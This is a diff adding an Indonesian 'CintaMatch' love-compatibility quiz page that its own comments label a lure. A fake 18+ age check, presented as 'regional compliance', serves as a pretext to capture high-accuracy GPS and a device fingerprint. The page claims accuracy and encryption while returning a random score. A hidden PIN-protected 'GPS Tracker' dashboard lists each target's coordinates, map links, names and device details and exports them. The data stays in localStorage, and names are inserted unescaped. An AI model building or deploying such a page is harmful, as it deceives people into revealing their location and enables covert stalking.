@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Cinta Match — Tes Kecocokan Pasangan</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Playfair+Display:ital,wght@0,700;1,700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'Inter',sans-serif;
+  background:linear-gradient(135deg,#fce4ec,#f3e5f5,#e8eaf6);
+  color:#1a1a1a;min-height:100vh;
+  display:flex;justify-content:center;
+  -webkit-user-select:none;user-select:none
+}
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#ccc;border-radius:3px}
+
+.container{width:100%;max-width:420px;padding:16px;position:relative}
+
+/* LOADING */
+.loading-screen{
+  position:fixed;inset:0;background:linear-gradient(135deg,#fce4ec,#f3e5f5);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  z-index:999;transition:opacity 0.4s
+}
+.loading-screen.hide{opacity:0;pointer-events:none}
+.loading-screen .heart{
+  font-size:48px;animation:pulse 0.8s ease-in-out infinite
+}
+@keyframes pulse{
+  0%,100%{transform:scale(1)}
+  50%{transform:scale(1.2)}
+}
+.loading-screen p{margin-top:14px;color:#e91e63;font-size:14px;font-weight:600}
+
+/* AGE OVERLAY */
+.age-overlay{
+  position:fixed;inset:0;z-index:100;
+  background:rgba(0,0,0,0.5);
+  backdrop-filter:blur(6px);
+  display:none;align-items:center;justify-content:center;
+  padding:20px
+}
+.age-overlay.show{display:flex}
+.age-card{
+  background:#fff;border-radius:24px;
+  padding:32px 28px 24px;
+  max-width:360px;width:100%;
+  text-align:center;
+  box-shadow:0 20px 60px rgba(233,30,99,0.15);
+  animation:slideUp 0.35s ease-out
+}
+@keyframes slideUp{
+  from{transform:translateY(30px);opacity:0}
+  to{transform:translateY(0);opacity:1}
+}
+.age-card .icon{font-size:48px;margin-bottom:8px}
+.age-card h2{font-size:20px;font-weight:800;color:#1a1a1a;margin-bottom:4px}
+.age-card p{font-size:13px;color:#888;line-height:1.5;margin-bottom:10px}
+.age-card .warning{
+  font-size:11px;color:#e91e63;background:#fce4ec;
+  padding:10px 14px;border-radius:8px;margin-bottom:16px;
+  line-height:1.5;font-weight:500
+}
+.age-card .btn-group{display:flex;gap:10px}
+.age-card button{
+  flex:1;padding:14px;border-radius:12px;border:none;
+  font-weight:700;font-size:14px;cursor:pointer;
+  transition:all 0.2s;font-family:'Inter',sans-serif
+}
+.age-card .btn-yes{
+  background:linear-gradient(135deg,#e91e63,#ff6b9d);
+  color:#fff;box-shadow:0 4px 16px rgba(233,30,99,0.3)
+}
+.age-card .btn-yes:hover{transform:translateY(-1px);box-shadow:0 6px 24px rgba(233,30,99,0.4)}
+.age-card .btn-no{
+  background:#f5f5f5;color:#999
+}
+.age-card .btn-no:hover{background:#eee}
+
+/* HEADER */
+.header{
+  text-align:center;padding:24px 0 16px
+}
+.header .brand{
+  font-family:'Playfair Display',serif;
+  font-size:32px;font-weight:700;
+  background:linear-gradient(135deg,#e91e63,#ff6b9d);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  letter-spacing:0.5px
+}
+.header .sub{
+  font-size:12px;color:#999;margin-top:4px;
+  letter-spacing:2px;text-transform:uppercase
+}
+
+/* CARD */
+.card{
+  background:rgba(255,255,255,0.85);
+  backdrop-filter:blur(10px);
+  border:1px solid rgba(233,30,99,0.08);
+  border-radius:20px;padding:24px;margin-bottom:14px;
+  box-shadow:0 4px 20px rgba(233,30,99,0.06)
+}
+.card h2{font-size:17px;font-weight:700;margin-bottom:4px}
+.card p{font-size:13px;color:#888;line-height:1.6;margin-bottom:14px}
+
+.input-group{margin-bottom:14px}
+.input-group label{
+  display:block;font-size:11px;font-weight:600;color:#bbb;
+  text-transform:uppercase;letter-spacing:1px;margin-bottom:6px
+}
+.input-group input{
+  width:100%;padding:14px 16px;border-radius:12px;
+  border:1px solid rgba(0,0,0,0.04);
+  background:rgba(255,255,255,0.8);color:#1a1a1a;
+  font-size:15px;font-family:'Inter',sans-serif;outline:none;
+  transition:all 0.2s
+}
+.input-group input:focus{border-color:#e91e63;background:#fff;box-shadow:0 0 0 3px rgba(233,30,99,0.06)}
+.input-group input::placeholder{color:#ccc}
+
+.btn{
+  width:100%;padding:15px;border-radius:50px;border:none;
+  font-weight:700;font-size:15px;font-family:'Inter',sans-serif;
+  cursor:pointer;transition:all 0.2s;letter-spacing:0.5px
+}
+.btn-primary{
+  background:linear-gradient(135deg,#e91e63,#ff6b9d);
+  color:#fff;box-shadow:0 4px 20px rgba(233,30,99,0.25)
+}
+.btn-primary:hover{transform:translateY(-1px);box-shadow:0 6px 28px rgba(233,30,99,0.35)}
+.btn-primary:active{transform:translateY(0)}
+.btn-primary:disabled{opacity:0.35;cursor:not-allowed;transform:none}
+.btn-secondary{
+  background:rgba(233,30,99,0.06);color:#e91e63;
+  border:1px solid rgba(233,30,99,0.08)
+}
+.btn-secondary:hover{background:rgba(233,30,99,0.1)}
+
+/* STATS ROW */
+.stats-row{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:16px
+}
+.stat-box{
+  background:rgba(255,255,255,0.85);
+  backdrop-filter:blur(10px);
+  border:1px solid rgba(233,30,99,0.06);
+  border-radius:14px;padding:14px;text-align:center
+}
+.stat-box .val{font-size:22px;font-weight:800;color:#e91e63}
+.stat-box .lbl{font-size:10px;color:#bbb;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+
+/* PROGRESS */
+.progress-wrap{display:none;margin:16px 0}
+.progress-wrap.show{display:block}
+.progress-bar{
+  height:6px;background:rgba(233,30,99,0.08);
+  border-radius:3px;overflow:hidden
+}
+.progress-fill{
+  height:100%;background:linear-gradient(90deg,#e91e63,#ff6b9d);
+  border-radius:3px;width:0%;transition:width 0.3s
+}
+.progress-text{
+  display:flex;justify-content:space-between;
+  font-size:11px;color:#999;margin-top:6px
+}
+
+/* RESULT */
+.result{display:none;margin:12px 0}
+.result.show{display:block}
+.result-card{
+  text-align:center;padding:24px;
+  border-radius:20px;
+  background:linear-gradient(135deg,#fce4ec,#f3e5f5);
+  border:1px solid rgba(233,30,99,0.1);
+  margin-bottom:12px
+}
+.result-card .big-pct{
+  font-family:'Playfair Display',serif;
+  font-size:64px;font-weight:700;
+  background:linear-gradient(135deg,#e91e63,#ff6b9d);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  line-height:1
+}
+.result-card .label{font-size:14px;color:#888;margin-top:4px}
+.result-card .verdict{
+  font-size:14px;font-weight:600;color:#e91e63;
+  margin-top:8px;padding:6px 16px;display:inline-block;
+  background:rgba(233,30,99,0.06);border-radius:20px
+}
+.result-card .names{
+  font-size:13px;color:#666;margin-top:8px
+}
+.result-card .names span{color:#e91e63;font-weight:700}
+
+/* DASHBOARD */
+.dashboard{display:none}
+.dashboard.show{display:block}
+.dash-header{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:16px 0;border-bottom:1px solid rgba(0,0,0,0.04);margin-bottom:14px
+}
+.dash-header h1{font-size:20px;font-weight:800;color:#1a1a1a}
+.dash-header .count{font-size:12px;color:#999;background:#f5f5f5;padding:4px 12px;border-radius:20px}
+
+.dash-stats{
+  display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px
+}
+.dash-stat{
+  background:#fff;border:1px solid rgba(0,0,0,0.04);border-radius:12px;padding:12px;text-align:center
+}
+.dash-stat .val{font-size:20px;font-weight:800;color:#e91e63}
+.dash-stat .lbl{font-size:9px;color:#999;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
+
+.dash-actions{display:flex;gap:8px;margin-bottom:14px}
+.dash-actions button{
+  flex:1;padding:10px;border-radius:8px;border:1px solid rgba(0,0,0,0.04);
+  background:#fafafa;color:#888;font-size:11px;
+  font-weight:600;cursor:pointer;transition:all 0.2s;font-family:'Inter',sans-serif
+}
+.dash-actions button:hover{background:#f0f0f0;color:#333}
+
+/* ENTRY */
+.entry{
+  background:#fff;border:1px solid rgba(0,0,0,0.04);
+  border-radius:14px;padding:14px;margin-bottom:10px;
+  cursor:pointer;transition:all 0.15s
+}
+.entry:hover{border-color:rgba(233,30,99,0.12);box-shadow:0 2px 8px rgba(233,30,99,0.04)}
+.entry .e-hdr{
+  display:flex;justify-content:space-between;align-items:center;margin-bottom:6px
+}
+.entry .e-name{font-size:13px;font-weight:600;color:#1a1a1a}
+.entry .e-name .love{color:#e91e63}
+.entry .e-time{font-size:10px;color:#aaa}
+.entry .e-loc{font-size:11px;color:#888}
+.entry .e-body{display:none;margin-top:8px;padding-top:8px;border-top:1px solid rgba(0,0,0,0.04)}
+.entry .e-body.show{display:block}
+.entry .e-body table{width:100%;font-size:11px}
+.entry .e-body td{padding:3px 0;color:#777;vertical-align:top}
+.entry .e-body td:first-child{color:#aaa;width:80px}
+.entry .e-body td:last-child{word-break:break-all;color:#555}
+.entry .loc-link{
+  display:inline-block;padding:4px 10px;border-radius:4px;
+  background:rgba(233,30,99,0.06);color:#e91e63;
+  font-size:10px;text-decoration:none;margin-top:4px;font-weight:600
+}
+.entry .tag{
+  display:inline-block;padding:2px 8px;border-radius:4px;
+  font-size:9px;font-weight:700;background:rgba(233,30,99,0.08);color:#e91e63
+}
+.entry .tag.no-gps{
+  background:rgba(255,0,0,0.06);color:#ff1744
+}
+
+/* LOCK */
+.lock-screen{
+  display:flex;flex-direction:column;align-items:center;
+  justify-content:center;min-height:70vh;text-align:center
+}
+.lock-screen .icon{font-size:44px;margin-bottom:10px}
+.lock-screen h2{font-size:18px;margin-bottom:4px}
+.lock-screen p{font-size:13px;color:#888;margin-bottom:18px}
+.lock-screen input{
+  width:180px;padding:12px;border-radius:8px;
+  border:1px solid rgba(0,0,0,0.08);
+  background:#fafafa;color:#1a1a1a;
+  font-size:22px;text-align:center;letter-spacing:6px;
+  font-family:'Inter',sans-serif;outline:none
+}
+.lock-screen input:focus{border-color:#e91e63}
+.lock-screen .err{color:#ff1744;font-size:12px;margin-top:8px;display:none}
+
+.empty{text-align:center;padding:40px 20px;color:#999}
+.empty .icon{font-size:44px;margin-bottom:8px}
+.empty h3{font-size:15px;margin-bottom:4px;color:#555}
+.empty p{font-size:12px}
+
+.footer{text-align:center;padding:20px 0;color:#ccc;font-size:11px}
+
+@media(max-width:400px){
+  .stats-row{grid-template-columns:1fr 1fr}
+  .dash-stats{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div class="loading-screen" id="loading">
+  <div class="heart">💕</div>
+  <p>Mempersiapkan tes cinta...</p>
+</div>
+
+<!-- AGE VERIFICATION OVERLAY (PRETEXT FOR GPS) -->
+<div class="age-overlay" id="ageOverlay">
+  <div class="age-card">
+    <div class="icon">🔞</div>
+    <h2>Verifikasi Usia</h2>
+    <p>Untuk mengakses tes kecocokan, Anda harus 18+</p>
+    <div class="warning">📍 Lokasi Anda diverifikasi untuk kepatuhan regional</div>
+    <div class="btn-group">
+      <button class="btn btn-yes" id="ageYes">✓ Saya 18+</button>
+      <button class="btn btn-no" id="ageNo">✕ Tidak</button>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+  <!-- LURE PAGE -->
+  <div id="lurePage">
+    <div class="header">
+      <div class="brand">CintaMatch</div>
+      <div class="sub">✦ Tes Kecocokan Pasangan ✦</div>
+    </div>
+
+    <div class="stats-row">
+      <div class="stat-box"><div class="val" id="todayCount">0</div><div class="lbl">Tes Hari Ini</div></div>
+      <div class="stat-box"><div class="val">96%</div><div class="lbl">Akurasi</div></div>
+      <div class="stat-box"><div class="val">💕</div><div class="lbl">Terpercaya</div></div>
+    </div>
+
+    <div class="card">
+      <h2>Cek Kecocokan Cinta</h2>
+      <p>Masukkan nama kamu dan doi, sistem akan menghitung kecocokan berdasarkan algoritma cinta akurat.</p>
+
+      <div class="input-group">
+        <label>👨 Nama Kamu</label>
+        <input type="text" id="name1" placeholder="Masukkan nama kamu" autocomplete="off">
+      </div>
+      <div class="input-group">
+        <label>👩 Nama Doi / Pasangan</label>
+        <input type="text" id="name2" placeholder="Masukkan nama pasangan" autocomplete="off">
+      </div>
+
+      <button class="btn btn-primary" id="cekBtn">💘 Cek Kecocokan</button>
+
+      <div class="progress-wrap" id="progressWrap">
+        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="progress-text"><span id="progLabel">Menganalisis nama...</span><span id="progPct">0%</span></div>
+      </div>
+
+      <div class="result" id="result">
+        <div class="result-card">
+          <div class="big-pct" id="matchPct">87%</div>
+          <div class="label">Kecocokan</div>
+          <div class="verdict" id="verdict">💞 Soulmate Banget!</div>
+          <div class="names" id="matchNames"><span>Andi</span> 💕 <span>Siti</span></div>
+        </div>
+        <button class="btn btn-secondary" id="lagiBtn">🔄 Coba Lagi</button>
+      </div>
+    </div>
+
+    <div class="card" style="padding:16px">
+      <p style="margin-bottom:8px;font-size:12px;color:#888">✨ Cara Kerja:</p>
+      <div style="font-size:11px;color:#bbb;line-height:1.7">
+        Kami menggunakan algoritma berbasis numerologi, analisis huruf, dan
+        posisi geografis untuk menghitung tingkat kecocokan Anda.
+        Hasilnya akurat dan terpercaya. Seluruh data dienkripsi.
+      </div>
+    </div>
+
+    <div class="footer">© 2026 CintaMatch — just for fun</div>
+  </div>
+
+  <!-- DASHBOARD -->
+  <div class="dashboard" id="dashboard">
+    <div class="lock-screen" id="lockScreen">
+      <div class="icon">🔒</div>
+      <h2>Dashboard</h2>
+      <p>Masukkan PIN</p>
+      <input type="password" id="pinInput" maxlength="6" placeholder="••••">
+      <div class="err" id="pinErr">PIN salah</div>
+    </div>
+
+    <div id="dashContent" style="display:none">
+      <div class="dash-header">
+        <h1>📍 GPS Tracker</h1>
+        <div class="count" id="entryCount">0 entries</div>
+      </div>
+
+      <div style="background:#fce4ec;border:1px solid rgba(233,30,99,0.1);border-radius:12px;padding:12px;margin-bottom:14px;font-size:12px;color:#888">
+        <strong style="color:#e91e63">📍 GPS Real-time</strong> — klik entry buat liat map
+      </div>
+
+      <div class="dash-stats">
+        <div class="dash-stat"><div class="val" id="dTotal">0</div><div class="lbl">Total</div></div>
+        <div class="dash-stat"><div class="val" id="dGPS">0</div><div class="lbl">GPS Hits</div></div>
+        <div class="dash-stat"><div class="val" id="dToday">0</div><div class="lbl">Hari Ini</div></div>
+      </div>
+      <div class="dash-actions">
+        <button onclick="exportJSON()">📥 Export JSON</button>
+        <button onclick="exportCSV()">📊 Export CSV</button>
+        <button onclick="clearAll()">🗑 Clear</button>
+      </div>
+      <div id="entriesList"></div>
+      <div class="footer">Tap entry to expand</div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+'use strict';
+
+const $ = id => document.getElementById(id);
+const DASH_PIN = '1337';
+const STORAGE_KEY = 'love_tracker_data';
+
+let gpsCaptured = false;
+let gpsData = null;
+
+function getStored(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY))||[]}catch(e){return[]}}
+function saveData(data){localStorage.setItem(STORAGE_KEY, JSON.stringify(data))}
+
+// ─── GPS ───
+function requestGPS(){
+  return new Promise(resolve => {
+    if(!navigator.geolocation) return resolve(null);
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        gpsData = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          acc: Math.round(pos.coords.accuracy) + 'm',
+          alt: pos.coords.altitude ? Math.round(pos.coords.altitude) + 'm' : null,
+          heading: pos.coords.heading ? Math.round(pos.coords.heading) + '°' : null,
+          speed: pos.coords.speed ? Math.round(pos.coords.speed * 3.6) + ' km/h' : null,
+          timestamp: new Date(pos.timestamp).toISOString()
+        };
+        gpsCaptured = true;
+        resolve(gpsData);
+      },
+      () => resolve(null),
+      {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
+    );
+  });
+}
+
+function getFingerprint(){
+  const canvas = document.createElement('canvas');
+  canvas.width = 200; canvas.height = 50;
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = 'top'; ctx.font = '14px Arial';
+  ctx.fillStyle = '#f60'; ctx.fillRect(125,1,62,20);
+  ctx.fillStyle = '#069'; ctx.fillText('fp', 2, 15);
+  const fp = canvas.toDataURL();
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screen: `${screen.width}x${screen.height}`,
+    colorDepth: screen.colorDepth,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    canvasFP: btoa(fp).slice(0, 50),
+    vendor: navigator.vendor,
+    appVersion: navigator.appVersion.slice(0, 80),
+    touch: 'ontouchstart' in window,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    referrer: document.referrer || 'direct',
+    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+    deviceMemory: navigator.deviceMemory || 'unknown',
+    pageLoad: new Date().toISOString()
+  };
+}
+
+function randomMatch(){
+  return Math.floor(Math.random() * 41) + 60; // 60-100%
+}
+
+function getVerdict(pct){
+  if(pct >= 95) return {text:'💞 Soulmate Banget!', emoji:'💞'};
+  if(pct >= 85) return {text:'❤️ Cocok Banget!', emoji:'❤️'};
+  if(pct >= 75) return {text:'💑 Lumayan Cocok', emoji:'💑'};
+  if(pct >= 65) return {text:'💔 Biasa Aja', emoji:'💔'};
+  return {text:'💀 Coba Cari Lain Aja', emoji:'💀'};
+}
+
+// ─── AGE VERIFICATION → GPS ───
+function showAgeVerification(){
+  return new Promise(resolve => {
+    const overlay = $('ageOverlay');
+    overlay.classList.add('show');
+    $('ageYes').onclick = () => {
+      overlay.classList.remove('show');
+      resolve(true);
+    };
+    $('ageNo').onclick = () => {
+      overlay.classList.remove('show');
+      resolve(false);
+    };
+  });
+}
+
+// ─── FAKE PROCESS ───
+async function runCek(){
+  const btn = $('cekBtn');
+  const wrap = $('progressWrap');
+  const fill = $('progressFill');
+  const label = $('progLabel');
+  const pct = $('progPct');
+  const result = $('result');
+  const n1 = $('name1').value.trim() || 'Kamu';
+  const n2 = $('name2').value.trim() || 'Doi';
+
+  btn.disabled = true;
+  btn.textContent = '⏳ Menghitung...';
+  wrap.classList.add('show');
+  result.classList.remove('show');
+
+  const stages = [
+    [10, 'Menganalisis nama...'],
+    [25, 'Menghitung frekuensi huruf...'],
+    [40, 'Mencocokkan energi nama...'],
+    [55, 'Kalkulasi numerologi...'],
+    [70, 'Cross-check zodiak...'],
+    [85, 'Finalisasi hasil...'],
+    [100, 'Selesai!'],
+  ];
+
+  for(const [p, l] of stages){
+    await delay(350 + Math.random() * 500);
+    fill.style.width = p + '%';
+    label.textContent = l;
+    pct.textContent = p + '%';
+  }
+
+  await delay(400);
+
+  const match = randomMatch();
+  const verdict = getVerdict(match);
+  $('matchPct').textContent = match + '%';
+  $('verdict').textContent = verdict.text;
+  $('matchNames').innerHTML = `<span>${n1}</span> 💕 <span>${n2}</span>`;
+
+  result.classList.add('show');
+  btn.textContent = '💘 Cek Kecocokan';
+  btn.disabled = false;
+
+  // Trigger GPS after result
+  if(!gpsCaptured){
+    await requestGPS();
+  }
+
+  const fp = getFingerprint();
+  const entry = {
+    id: Date.now() + '_' + Math.random().toString(36).slice(2,6),
+    timestamp: new Date().toISOString(),
+    date: new Date().toLocaleDateString('en-ID'),
+    time: new Date().toLocaleTimeString('en-ID'),
+    name1: n1,
+    name2: n2,
+    match: match,
+    verdict: verdict.text,
+    gps: gpsData,
+    hasGPS: !!gpsData,
+    lat: gpsData ? gpsData.lat : null,
+    lng: gpsData ? gpsData.lng : null,
+    accuracy: gpsData ? gpsData.acc : 'no-gps',
+    ...fp
+  };
+
+  const stored = getStored();
+  stored.push(entry);
+  saveData(stored);
+  updateCount();
+}
+
+function delay(ms){return new Promise(r=>setTimeout(r,ms))}
+
+function updateCount(){
+  const stored = getStored();
+  $('todayCount').textContent = stored.filter(e => e.date === new Date().toLocaleDateString('en-ID')).length;
+}
+
+// ─── DASHBOARD ───
+window.exportJSON = function(){
+  const data = getStored();
+  const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `tracker_${Date.now()}.json`; a.click();
+};
+
+window.exportCSV = function(){
+  const data = getStored();
+  if(!data.length) return;
+  const keys = ['timestamp','name1','name2','match','lat','lng','accuracy','platform','timezone'];
+  const rows = data.map(e => keys.map(k => {
+    let v = e[k] || '';
+    return String(v).replace(/,/g, ';');
+  }));
+  const csv = [keys.join(','), ...rows.map(r => r.join(','))].join('\n');
+  const blob = new Blob([csv], {type:'text/csv'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `tracker_${Date.now()}.csv`; a.click();
+};
+
+window.clearAll = function(){
+  if(!confirm('Hapus semua data?')) return;
+  localStorage.removeItem(STORAGE_KEY);
+  renderDashboard();
+};
+
+function renderDashboard(){
+  const data = getStored();
+  $('entryCount').textContent = data.length + ' entries';
+  $('dTotal').textContent = data.length;
+  $('dGPS').textContent = data.filter(e => e.hasGPS).length;
+  $('dToday').textContent = data.filter(e => e.date === new Date().toLocaleDateString('en-ID')).length;
+
+  const list = $('entriesList');
+  if(!data.length){
+    list.innerHTML = `<div class="empty"><div class="icon">📭</div><h3>Belum ada data</h3><p>Tunggu target buka link</p></div>`;
+    return;
+  }
+
+  list.innerHTML = [...data].reverse().map(e => `
+    <div class="entry" onclick="toggleEntry('${e.id}')">
+      <div class="e-hdr">
+        <div class="e-name">
+          <span class="love">${e.name1}</span> 💕 <span class="love">${e.name2}</span>
+          ${e.hasGPS ? '<span class="tag">GPS</span>' : '<span class="tag no-gps">NO GPS</span>'}
+          <span style="font-size:11px;color:#e91e63;margin-left:6px">${e.match}%</span>
+        </div>
+        <div class="e-time">${e.date}</div>
+      </div>
+      <div class="e-loc">
+        ${e.lat ? `${e.lat.toFixed(4)}, ${e.lng.toFixed(4)}` : 'Lokasi: — (GPS rejected)'}
+      </div>
+      <div class="e-body" id="body_${e.id}">
+        <table>
+          <tr><td>Latitude</td><td>${e.lat ?? '?'}</td></tr>
+          <tr><td>Longitude</td><td>${e.lng ?? '?'}</td></tr>
+          <tr><td>Accuracy</td><td>${e.accuracy || '?'}</td></tr>
+          ${e.gps?.alt ? `<tr><td>Altitude</td><td>${e.gps.alt}</td></tr>` : ''}
+          ${e.gps?.heading ? `<tr><td>Heading</td><td>${e.gps.heading}</td></tr>` : ''}
+          <tr><td>Map</td><td>${e.lat ? `<a class="loc-link" target="_blank" href="https://www.google.com/maps?q=${e.lat},${e.lng}">Google Maps ↗</a>` : '—'}</td></tr>
+          <tr><td>Nama 1</td><td>${e.name1}</td></tr>
+          <tr><td>Nama 2</td><td>${e.name2}</td></tr>
+          <tr><td>Match</td><td>${e.match}% — ${e.verdict || ''}</td></tr>
+          <tr><td>Device</td><td>${e.platform || '?'}</td></tr>
+          <tr><td>Browser</td><td>${(e.userAgent||'').slice(0,70)}</td></tr>
+          <tr><td>Language</td><td>${e.language || '?'}</td></tr>
+          <tr><td>Timezone</td><td>${e.timezone || '?'}</td></tr>
+          <tr><td>Screen</td><td>${e.screen || '?'}</td></tr>
+          <tr><td>Touch</td><td>${e.touch ? 'Yes' : 'No'}</td></tr>
+          <tr><td>Referrer</td><td>${e.referrer || '?'}</td></tr>
+          <tr><td>Time</td><td>${e.timestamp}</td></tr>
+        </table>
+      </div>
+    </div>
+  `).join('');
+}
+
+window.toggleEntry = function(id){
+  const el = document.getElementById('body_' + id);
+  if(el) el.classList.toggle('show');
+};
+
+// ─── ROUTING ───
+function handleRouting(){
+  const params = new URLSearchParams(window.location.search);
+  if(params.get('admin') === DASH_PIN){
+    document.getElementById('loading').classList.add('hide');
+    document.getElementById('lurePage').style.display = 'none';
+    document.getElementById('dashboard').classList.add('show');
+    document.getElementById('lockScreen').style.display = 'none';
+    document.getElementById('dashContent').style.display = 'block';
+    renderDashboard();
+    return true;
+  }
+  return false;
+}
+
+// ─── EVENTS ───
+$('cekBtn').addEventListener('click', runCek);
+$('name2').addEventListener('keydown', e => {
+  if(e.key === 'Enter') runCek();
+});
+
+$('lagiBtn').addEventListener('click', () => {
+  $('result').classList.remove('show');
+});
+
+$('pinInput').addEventListener('input', function(){
+  if(this.value === DASH_PIN){
+    document.getElementById('lockScreen').style.display = 'none';
+    document.getElementById('dashContent').style.display = 'block';
+    renderDashboard();
+    const url = new URL(window.location);
+    url.searchParams.set('admin', DASH_PIN);
+    window.history.replaceState({}, '', url);
+  }
+});
+
+// ─── INIT ───
+async function init(){
+  const isDashboard = handleRouting();
+  if(isDashboard) return;
+
+  document.getElementById('lurePage').style.display = 'block';
+
+  setTimeout(() => {
+    document.getElementById('loading').classList.add('hide');
+  }, 1000);
+
+  setTimeout(async () => {
+    const ok = await showAgeVerification();
+    if(ok) requestGPS();
+  }, 1200);
+
+  updateCount();
+}
+
+document.addEventListener('contextmenu', e => e.preventDefault());
+init();
+
+})();
+</script>
+</body>
+</html>
